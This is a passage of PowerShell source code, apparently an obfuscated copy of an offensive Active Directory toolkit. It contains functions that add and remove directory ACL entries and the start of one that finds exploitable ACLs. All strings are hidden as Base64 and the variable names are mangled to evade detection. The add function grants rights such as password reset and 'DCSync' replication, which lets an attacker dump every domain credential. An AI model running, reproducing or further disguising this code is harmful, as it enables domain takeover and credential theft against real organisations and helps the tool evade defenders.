        $Credential = [Management.Automation.PSCredential]::Empty,
        [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync')]
        [String]
        $Rights = 'All',
        [Guid]
        $RightsGUID
    )
    BEGIN {
        ${__/\/=\___/=\/=\/} = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA==')))
            'Raw' = $True
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQARABvAG0AYQBpAG4A')))]) { ${__/\/=\___/=\/=\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $TargetDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQATABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { ${__/\/=\___/=\/=\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $TargetLDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQAUwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${__/\/=\___/=\/=\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $TargetSearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${__/\/=\___/=\/=\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${__/\/=\___/=\/=\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${__/\/=\___/=\/=\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${__/\/=\___/=\/=\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${__/\/=\___/=\/=\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${__/\/=\___/=\/=\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${___/=\/==\/\_/==\} = @{
            'Identity' = $PrincipalIdentity
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAbwBiAGoAZQBjAHQAcwBpAGQA')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgBjAGkAcABhAGwARABvAG0AYQBpAG4A')))]) { ${___/=\/==\/\_/==\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $PrincipalDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${___/=\/==\/\_/==\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${___/=\/==\/\_/==\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${___/=\/==\/\_/==\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${___/=\/==\/\_/==\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${___/=\/==\/\_/==\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${___/=\/==\/\_/==\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${_/\_/\_/=\_/===\_} = ___/\___/\__/===\/ @___/=\/==\/\_/==\
        if (-not ${_/\_/\_/=\_/===\_}) {
            throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAByAGUAcwBvAGwAdgBlACAAcAByAGkAbgBjAGkAcABhAGwAOgAgACQAUAByAGkAbgBjAGkAcABhAGwASQBkAGUAbgB0AGkAdAB5AA==')))
        }
    }
    PROCESS {
        ${__/\/=\___/=\/=\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = ${___/\/=\_/=\__/\/}
        ${_/=\/\__/==\/=\_/} = ___/\___/\__/===\/ @__/\/=\___/=\/=\/
        ForEach (${/==\__/\_/=\/==\_} in ${_/=\/\__/==\/=\_/}) {
            $InheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AZQA=')))
            ${____/\_/\__/=\/=\} = [System.Security.AccessControl.AccessControlType] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwB3AA==')))
            ${_/\____/=\_/=\/==} = @()
            if ($RightsGUID) {
                ${_/=\_/=\__/\_/\/=} = @($RightsGUID)
            }
            else {
                ${_/=\_/=\__/\_/\/=} = Switch ($Rights) {
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQB0AFAAYQBzAHMAdwBvAHIAZAA='))) { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwADIAOQA5ADUANwAwAC0AMgA0ADYAZAAtADEAMQBkADAALQBhADcANgA4AC0AMAAwAGEAYQAwADAANgBlADAANQAyADkA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAE0AZQBtAGIAZQByAHMA'))) { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBmADkANgA3ADkAYwAwAC0AMABkAGUANgAtADEAMQBkADAALQBhADIAOAA1AC0AMAAwAGEAYQAwADAAMwAwADQAOQBlADIA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAFMAeQBuAGMA'))) { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQAxADMAMQBmADYAYQBhAC0AOQBjADAANwAtADEAMQBkADEALQBmADcAOQBmAC0AMAAwAGMAMAA0AGYAYwAyAGQAYwBkADIA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQAxADMAMQBmADYAYQBkAC0AOQBjADAANwAtADEAMQBkADEALQBmADcAOQBmAC0AMAAwAGMAMAA0AGYAYwAyAGQAYwBkADIA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('OAA5AGUAOQA1AGIANwA2AC0ANAA0ADQAZAAtADQAYwA2ADIALQA5ADkAMQBhAC0AMABmAGEAYwBiAGUAZABhADYANAAwAGMA')))}
                }
            }
            ForEach (${__/\_/=====\/====} in ${_/\_/\_/=\_/===\_}) {
                Write-Verbose "[Add-DomainObjectAcl] Granting principal $(${__/\_/=====\/====}.distinguishedname) '$Rights' on $(${/==\__/\_/=\/==\_}.Properties.distinguishedname)"
                try {
                    $Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]${__/\_/=====\/====}.objectsid)
                    if (${_/=\_/=\__/\_/\/=}) {
                        ForEach (${_/\_/==\_/=\_/=\/} in ${_/=\_/=\__/\_/\/=}) {
                            ${/=\_/==\_/\/\/=\/} = New-Object Guid ${_/\_/==\_/=\_/=\/}
                            ${__/==\_/===\/=\__} = [System.DirectoryServices.ActiveDirectoryRights] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAZQBuAGQAZQBkAFIAaQBnAGgAdAA=')))
                            ${_/\____/=\_/=\/==} += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, ${__/==\_/===\/=\__}, ${____/\_/\__/=\/=\}, ${/=\_/==\_/\/\/=\/}, $InheritanceType
                        }
                    }
                    else {
                        ${__/==\_/===\/=\__} = [System.DirectoryServices.ActiveDirectoryRights] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAG4AZQByAGkAYwBBAGwAbAA=')))
                        ${_/\____/=\_/=\/==} += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, ${__/==\_/===\/=\__}, ${____/\_/\__/=\/=\}, $InheritanceType
                    }
                    ForEach (${_/\/=\/\_/\/=\/=\} in ${_/\____/=\_/=\/==}) {
                        Write-Verbose "[Add-DomainObjectAcl] Granting principal $(${__/\_/=====\/====}.distinguishedname) rights GUID '$(${_/\/=\/\_/\/=\/=\}.ObjectType)' on $(${/==\__/\_/=\/==\_}.Properties.distinguishedname)"
                        ${_/=\/==\/\/\/===\} = ${/==\__/\_/=\/==\_}.GetDirectoryEntry()
                        ${_/=\/==\/\/\/===\}.PsBase.Options.SecurityMasks = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAGMAbAA=')))
                        ${_/=\/==\/\/\/===\}.PsBase.ObjectSecurity.AddAccessRule(${_/\/=\/\_/\/=\/=\})
                        ${_/=\/==\/\/\/===\}.PsBase.CommitChanges()
                    }
                }
                catch {
                    Write-Verbose "[Add-DomainObjectAcl] Error granting principal $(${__/\_/=====\/====}.distinguishedname) '$Rights' on $(${/==\__/\_/=\/==\_}.Properties.distinguishedname) : $_"
                }
            }
        }
    }
}
function Remove-DomainObjectAcl {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        ${___/\/=\_/=\__/\/},
        [ValidateNotNullOrEmpty()]
        [String]
        $TargetDomain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $TargetLDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String]
        $TargetSearchBase,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PrincipalIdentity,
        [ValidateNotNullOrEmpty()]
        [String]
        $PrincipalDomain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync')]
        [String]
        $Rights = 'All',
        [Guid]
        $RightsGUID
    )
    BEGIN {
        ${__/\/=\___/=\/=\/} = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA==')))
            'Raw' = $True
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQARABvAG0AYQBpAG4A')))]) { ${__/\/=\___/=\/=\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $TargetDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQATABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { ${__/\/=\___/=\/=\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $TargetLDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQAUwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${__/\/=\___/=\/=\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $TargetSearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${__/\/=\___/=\/=\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${__/\/=\___/=\/=\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${__/\/=\___/=\/=\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${__/\/=\___/=\/=\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${__/\/=\___/=\/=\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${__/\/=\___/=\/=\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${___/=\/==\/\_/==\} = @{
            'Identity' = $PrincipalIdentity
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAbwBiAGoAZQBjAHQAcwBpAGQA')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgBjAGkAcABhAGwARABvAG0AYQBpAG4A')))]) { ${___/=\/==\/\_/==\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $PrincipalDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${___/=\/==\/\_/==\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${___/=\/==\/\_/==\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${___/=\/==\/\_/==\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${___/=\/==\/\_/==\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${___/=\/==\/\_/==\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${___/=\/==\/\_/==\}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${_/\_/\_/=\_/===\_} = ___/\___/\__/===\/ @___/=\/==\/\_/==\
        if (-not ${_/\_/\_/=\_/===\_}) {
            throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAByAGUAcwBvAGwAdgBlACAAcAByAGkAbgBjAGkAcABhAGwAOgAgACQAUAByAGkAbgBjAGkAcABhAGwASQBkAGUAbgB0AGkAdAB5AA==')))
        }
    }
    PROCESS {
        ${__/\/=\___/=\/=\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = ${___/\/=\_/=\__/\/}
        ${_/=\/\__/==\/=\_/} = ___/\___/\__/===\/ @__/\/=\___/=\/=\/
        ForEach (${/==\__/\_/=\/==\_} in ${_/=\/\__/==\/=\_/}) {
            $InheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AZQA=')))
            ${____/\_/\__/=\/=\} = [System.Security.AccessControl.AccessControlType] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwB3AA==')))
            ${_/\____/=\_/=\/==} = @()
            if ($RightsGUID) {
                ${_/=\_/=\__/\_/\/=} = @($RightsGUID)
            }
            else {
                ${_/=\_/=\__/\_/\/=} = Switch ($Rights) {
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQB0AFAAYQBzAHMAdwBvAHIAZAA='))) { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwADIAOQA5ADUANwAwAC0AMgA0ADYAZAAtADEAMQBkADAALQBhADcANgA4AC0AMAAwAGEAYQAwADAANgBlADAANQAyADkA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAE0AZQBtAGIAZQByAHMA'))) { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBmADkANgA3ADkAYwAwAC0AMABkAGUANgAtADEAMQBkADAALQBhADIAOAA1AC0AMAAwAGEAYQAwADAAMwAwADQAOQBlADIA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAFMAeQBuAGMA'))) { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQAxADMAMQBmADYAYQBhAC0AOQBjADAANwAtADEAMQBkADEALQBmADcAOQBmAC0AMAAwAGMAMAA0AGYAYwAyAGQAYwBkADIA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQAxADMAMQBmADYAYQBkAC0AOQBjADAANwAtADEAMQBkADEALQBmADcAOQBmAC0AMAAwAGMAMAA0AGYAYwAyAGQAYwBkADIA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('OAA5AGUAOQA1AGIANwA2AC0ANAA0ADQAZAAtADQAYwA2ADIALQA5ADkAMQBhAC0AMABmAGEAYwBiAGUAZABhADYANAAwAGMA')))}
                }
            }
            ForEach (${__/\_/=====\/====} in ${_/\_/\_/=\_/===\_}) {
                Write-Verbose "[Remove-DomainObjectAcl] Removing principal $(${__/\_/=====\/====}.distinguishedname) '$Rights' from $(${/==\__/\_/=\/==\_}.Properties.distinguishedname)"
                try {
                    $Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]${__/\_/=====\/====}.objectsid)
                    if (${_/=\_/=\__/\_/\/=}) {
                        ForEach (${_/\_/==\_/=\_/=\/} in ${_/=\_/=\__/\_/\/=}) {
                            ${/=\_/==\_/\/\/=\/} = New-Object Guid ${_/\_/==\_/=\_/=\/}
                            ${__/==\_/===\/=\__} = [System.DirectoryServices.ActiveDirectoryRights] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAZQBuAGQAZQBkAFIAaQBnAGgAdAA=')))
                            ${_/\____/=\_/=\/==} += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, ${__/==\_/===\/=\__}, ${____/\_/\__/=\/=\}, ${/=\_/==\_/\/\/=\/}, $InheritanceType
                        }
                    }
                    else {
                        ${__/==\_/===\/=\__} = [System.DirectoryServices.ActiveDirectoryRights] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAG4AZQByAGkAYwBBAGwAbAA=')))
                        ${_/\____/=\_/=\/==} += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, ${__/==\_/===\/=\__}, ${____/\_/\__/=\/=\}, $InheritanceType
                    }
                    ForEach (${_/\/=\/\_/\/=\/=\} in ${_/\____/=\_/=\/==}) {
                        Write-Verbose "[Remove-DomainObjectAcl] Granting principal $(${__/\_/=====\/====}.distinguishedname) rights GUID '$(${_/\/=\/\_/\/=\/=\}.ObjectType)' on $(${/==\__/\_/=\/==\_}.Properties.distinguishedname)"
                        ${_/=\/==\/\/\/===\} = ${/==\__/\_/=\/==\_}.GetDirectoryEntry()
                        ${_/=\/==\/\/\/===\}.PsBase.Options.SecurityMasks = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAGMAbAA=')))
                        ${_/=\/==\/\/\/===\}.PsBase.ObjectSecurity.RemoveAccessRule(${_/\/=\/\_/\/=\/=\})
                        ${_/=\/==\/\/\/===\}.PsBase.CommitChanges()
                    }
                }
                catch {
                    Write-Verbose "[Remove-DomainObjectAcl] Error removing principal $(${__/\_/=====\/====}.distinguishedname) '$Rights' from $(${/==\__/\_/=\/==\_}.Properties.distinguishedname) : $_"
                }
            }
        }
    }
}
function Find-InterestingDomainAcl {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ACL')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DomainName', 'Name')]
        [String]
        $Domain,
        [Switch]
        $ResolveGUIDs,
        [String]
        [ValidateSet('All', 'ResetPassword', 'WriteMembers')]
        $RightsFilter,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${/=\/\/\/\___/==\/} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAbwBsAHYAZQBHAFUASQBEAHMA')))]) { ${/=\/\/\/\___/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAbwBsAHYAZQBHAFUASQBEAHMA')))] = $ResolveGUIDs }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBpAGcAaAB0AHMARgBpAGwAdABlAHIA')))]) { ${/=\/\/\/\___/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBpAGcAaAB0AHMARgBpAGwAdABlAHIA')))] = $RightsFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { ${/=\/\/\/\___/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${/=\/\/\/\___/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${/=\/\/\/\___/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${/=\/\/\/\___/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${/=\/\/\/\___/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${/=\/\/\/\___/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${/=\/\/\/\___/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/=\/\/\/\___/==\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${_/\/\/=\_/===\_/\} = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlACwAbwBiAGoAZQBjAHQAYwBsAGEAcwBzAA==')))
            'Raw' = $True
        }
